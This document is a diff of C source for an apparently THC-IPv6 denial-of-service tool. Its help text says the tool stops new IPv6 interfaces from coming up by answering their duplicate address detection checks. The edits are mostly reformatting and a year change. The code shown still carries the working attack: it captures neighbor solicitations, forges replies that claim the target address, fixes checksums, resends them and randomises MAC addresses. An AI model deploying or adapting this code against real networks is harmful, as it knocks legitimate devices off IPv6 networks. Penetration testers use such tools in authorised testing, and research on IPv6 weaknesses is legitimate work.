@@ -21,39 +21,38 @@ char *ptr3, *ptr4;
 int i;
 
 void help(char *prg) {
-  printf("%s %s (c) 2010 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
+  printf("%s %s (c) 2011 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
   printf("Syntax: %s interface\n\n", prg);
   printf("This tools prevents new ipv6 interfaces to come up, by sending answers to\n");
   printf("duplicate ip6 checks (DAD). This results in a DOS for new ipv6 devices.\n\n");
   exit(-1);
 }
 
-void intercept(u_char *foo, const struct pcap_pkthdr *header, const unsigned char *data) {
-  unsigned char *ipv6hdr = (unsigned char *)(data + 14);
+void intercept(u_char * foo, const struct pcap_pkthdr *header, const unsigned char *data) {
+  unsigned char *ipv6hdr = (unsigned char *) (data + 14);
 
   if (debug) {
     printf("DEBUG: packet received\n");
-    thc_dump_data((unsigned char *)data, header->caplen, "Received Packet");
+    thc_dump_data((unsigned char *) data, header->caplen, "Received Packet");
   }
   if (ipv6hdr[6] != NXT_ICMP6 || ipv6hdr[40] != ICMP6_NEIGHBORSOL || header->caplen < 78)
     return;
-  if (*(data+22) + *(data+23) + *(data+24) + *(data+25) + *(data+34) + *(data+35) + *(data+36) + *(data+37) != 0)
+  if (*(data + 22) + *(data + 23) + *(data + 24) + *(data + 25) + *(data + 34) + *(data + 35) + *(data + 36) + *(data + 37) != 0)
     return;
   if (debug)
     printf("DEBUG: packet is a valid duplicate ip6 check via icmp6 neighbor solitication\n");
 
-  memcpy(ipv6->pkt + 22, data + 62, 16); // copy target to srcip6
-  memcpy(ipv6->pkt + 62, data + 62, 16); // copy target to target
+  memcpy(ipv6->pkt + 22, data + 62, 16);        // copy target to srcip6
+  memcpy(ipv6->pkt + 62, data + 62, 16);        // copy target to target
   mychecksum = checksum_pseudo_header(ipv6->pkt + 22, ipv6->pkt + 38, NXT_ICMP6, ipv6->pkt + 54, 32);
   ipv6->pkt[56] = mychecksum / 256;
   ipv6->pkt[57] = mychecksum % 256;
-  
+
   thc_send_pkt(interface, pkt, &pkt_len);
 
-  ptr3 = thc_ipv62string(ipv6->pkt + 22);
-  ptr4 = thc_string2notation(ptr3);
+  ptr4 = thc_ipv62notation(ipv6->pkt + 22);
   printf("Spoofed packet for existing ip6 as %s\n", ptr4);
-  free(ptr3); free(ptr4);
+  free(ptr4);
 
   if (fork() == 0) {
     usleep(200);
@@ -61,14 +60,14 @@ void intercept(u_char *foo, const struct pcap_pkthdr *header, const unsigned cha
     thc_send_pkt(interface, pkt, &pkt_len);
     exit(0);
   }
-  
+
   ipv6->pkt[56] = 0;
   ipv6->pkt[57] = 0;
   // new random mac for next duplicate check
   for (i = 2; i < 6; i++)
     ipv6->pkt[6 + i] = rand() % 256;
   memcpy(ipv6->pkt + 80, ipv6->pkt + 6, 6);
-  
+
   (void) wait3(NULL, WNOHANG, NULL);
   return;
 }
@@ -99,7 +98,7 @@ int main(int argc, char *argv[]) {
   ipv6 = (thc_ipv6_hdr *) pkt;
   memset(ipv6->pkt + 56, 0, 2); // reset checksum to zero
   srand(time(NULL) + getpid());
-  for (i = 2; i < 6; i++) // set a random mac, keeping the first two bytes
+  for (i = 2; i < 6; i++)       // set a random mac, keeping the first two bytes
     ipv6->pkt[6 + i] = rand() % 256;
   memcpy(ipv6->pkt + 80, ipv6->pkt + 6, 6);
   if (debug) {
